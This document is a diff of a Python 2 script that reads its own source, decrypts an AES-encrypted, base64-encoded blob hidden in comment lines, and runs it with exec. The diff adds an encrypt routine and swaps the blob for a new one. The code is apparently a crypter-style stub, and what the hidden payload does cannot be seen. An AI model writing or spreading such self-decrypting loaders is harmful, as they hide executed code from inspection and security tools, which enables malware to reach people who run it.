@@ -1,5 +1,6 @@
 ######################################################## First script python
 # coding=utf-8
+# Start Uncrypted
 import os                        
 import __main__                                     
 import base64
@@ -8,6 +9,16 @@ import StringIO
 from Crypto import Random
 from Crypto.Cipher import AES
 from Crypto import Random
+
+def encrypt(data):
+   this = open(__main__.__file__, 'r')
+   key = this.readline()
+   iv = Random.new().read(AES.block_size)
+   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
+   encrypted = iv + cipher.encrypt(data)
+
+   return base64.b64encode(encrypted)
+ ####################
 
 # Decryption function
 def decrypt(data):
@@ -36,25 +47,12 @@ for line in this:
    elif copy:
       cipher_payload = cipher_payload + line
 
-e = decrypt(cipher_payload)
-#print e
+e = decrypt(cipher_payload[1:])
+#e = encrypt(cipher_payload)
+print e
 exec e
 sys.exit('Good job!')
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# End Uncrypted
 
 
 
@@ -68,5 +66,5 @@ sys.exit('Good job!')
 
 
 #Start payload
-#7dVc+Y0s14E6nT9pUSKhvMFSiajSvHK6DbL1KKTDSKgG4R0VigsbcoJblBbMq7Hs6ciTNYWka9qgVDgo3LmtWXvCGUVg89Jil/YVUC7thk+EhbNpr6e1pQIkmlV8DlcZUgfs0ScaqiQVA7srBWU4DeXoCpZyFgzwsXKf8Sy5Oq1/eDs256zqmcTdSAl4maNN5e2qOGUIBnUdt9fAkNjiYUaX2v5S9zY6SNlZIaiNcM8rpcf6PNMj1IuPEVfYIKOoywYX6zH5Ce+tbs/OYiSkuMcHbkuc4b4rqwftOnv6t46gJ5v7UQFKyiI/sNfCQ69wZtDZ0Hg68oBnqYae4RgBGWh0WGRpQbMX6ggFIBC80BWj5emWPduJ7YSmi37wQQ+IesFeLOW4SKYTadk41Qnbj0U/8ciXlyn4TsbBMsFYMogRwJ1tGX8Kr2TcxLIbBB8ljp9Yd1wear7lIogJF9XwFTn0fBCfsWxHGiODu2p+0efGg9rNh2DhepXCwAWCrwIXp5YG7ZThdaLGui5uNqgeRsAxmYa1szkw0coseTy6w6E7unx+LCq/yw93SKQ1oPc49UazcooYH6WtwTFCdJ9+j+icHSdaI3eBmFoM0qTasas98mU3OhgMYrU8+kgRgwsSW7HBOKlQgbVvtihvxgEO9IJLApwNaHZwnU1i0EEn4Bv8+PnXRIH/d2nFlT+XjW2WcfvFdCnwq++cYAW/5BSEnUDeHnHV4I+XgZd5PaYozcoxngRqDRocrbqA11z0UpOws+mi3KGX2QBBZcdpL5xW4CL0i4raU2Mk4qBVMFf7ey3hPueuFJzs4lD6TkRWXyzWjn6M9aNKglVzwtOUUn5Xgywzx8/9J7Q/eun6YwfIEMB1LbOgrt0wZwTzEb4f5S0QREfxG9jxRipB7iTXUajTRyjgHlKkcCpPc94gkzmyiWf16GJjhePGv5SblVSywmtfGQROfSDZbUZS04J0JZ0wmskam8iFPhkpEK5cmIXvQMQM72qEeLPbDGNCw+Sw/Ithn+20yX0H/pPWepgYEDhMflZykAmadQtY5dc18tyVRbwOIsf1XJRTRAk06iLqM5H1A3PoLWnsmi5bSZBFgbWE/r2acUPcScbcynIii4rJCubW361/z+zLVbMkcELIdE1MMZYC9Su50W4Sc0PfrkEMd/TTgfSdY1+9Ebb8Olr08ImrTVS2BQJK6RkC7hhr8FV9HO6yIRvwBJOPbb38LB3/wAngNn0ymaJelq2WTRXEvuMIgzI+KtHVgX06ghnQY+bjbEyYuBTagdvIG+Vg3E24ymmcw64Z0yIcF5wMMg1q5C9DBsmFpSUaz30hbJr8XKICHA7laPHaWSUg3Q3IQV4TS4R6G4fW6u7rmOqpqLQYWLhLqfBDzXGsZHRBbgio7QaQkeElgjoq4QhmJUPxcAg0Z/dC1KDlYSGauK7XHLdytGwlEtentXiyjAc1q7L0KxH1WUcjqQWUbJupQ6B/ZC562NPGm6dloZhKLc9WIRPHn1aHs89fePiKjSDys3YryCT8pi4/ZRvWW+AMqX2wO95EJ2QrHXmjNtlcM/j4vXQg5MQHuK31fncJk7GOmqVwYP5WvoTwmZQ6AvOjVnryG3cYnMeyMlNS12Si1+64k87SJa9KinpGvawA34I+k5v61tZiwe8fmlcmtdVqBUC0IPML7qiswg6bpvAxREgs6WcpoDXbBFe2YQrM47XWNPBwvJyrDMPZgttD/UcIbiYwZQJ9FYqS7UnmJESScDMgvgWA+/E4mMj5dBpmPekH6UymUHkhTZSrE7/7nLcUJlfRIXWMgCYirFAdfKTmUuDx0bCI0/Vl++o3AbxavjwI+m7gDwwj+O4DgSSpO9ZXYVo8uJ/qQhYuL6/bhromI3n2Zsmb2joNXYprbMKlr5cd9SXvIOtMlss+02aaV6YfCTGsfF4qCEPooeC7MYQHC6KHi09itQN/Xsj+g5nZPqEfPeuK3F7bKTU=
+#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
 #End payload
